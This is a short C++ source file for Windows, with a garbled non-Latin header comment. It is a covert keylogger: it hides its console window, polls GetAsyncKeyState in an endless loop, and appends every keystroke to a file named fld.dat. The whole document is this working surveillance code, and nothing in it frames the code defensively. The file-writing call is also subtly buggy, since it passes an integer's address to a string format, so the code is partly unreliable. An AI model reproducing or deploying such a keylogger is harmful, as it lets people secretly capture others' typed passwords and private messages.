/*������ ������� ����������, ������� ����. � fld.dat*/

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
using namespace std;

int S (int key, char *files)
{
    if ( (key == 1) || (key == 2) )
        return 0;

    FILE *Save;
    Save = fopen(files, "a+");
    cout << key << endl;
    fprintf(Save, "%s", &key);
    fclose (Save);
    return 0;
}

void Hide()
{
  HWND Hide;
  AllocConsole();
  Hide = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Hide,0);
}

int main()
{
    Hide();

    char q;
    int a=0;

    while (1)
    {
        for(q = 8; q <= 190; q++)
        {
if (GetAsyncKeyState(q) == -32767)
S (q,"fld.dat");
else {
	a++;
if(a==15)
  {
    Sleep(1);
    a=0;
  }//end if
}
     }//end for
    }//end while
    system ("PAUSE");
return 0;
}//end main()

